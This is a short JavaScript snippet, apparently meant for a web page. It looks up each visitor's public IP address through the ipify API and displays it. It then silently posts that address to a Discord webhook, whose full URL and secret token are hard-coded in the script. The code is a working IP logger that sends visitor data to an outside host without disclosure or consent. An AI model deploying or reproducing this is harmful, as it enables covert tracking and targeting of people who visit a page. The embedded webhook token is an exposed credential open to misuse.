// Get the visitor's IP address using the ipify API
fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        const ipAddress = data.ip;
        document.getElementById('ip-address').innerText = ipAddress;

        // Send the IP address to the Discord webhook
        const webhookUrl = 'https://discord.com/api/webhooks/1348973855217156116/Y_wUbOXZn0U769LrIiPAFSE7VszYA1Kjc3y_35KnOXXKxn6EsA-ggbDVlunb8GLhh6kd';
        const payload = {
            'content': `Visitor IP: ${ipAddress}`
        };
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error(error));
    })
    .catch(error => console.error(error));
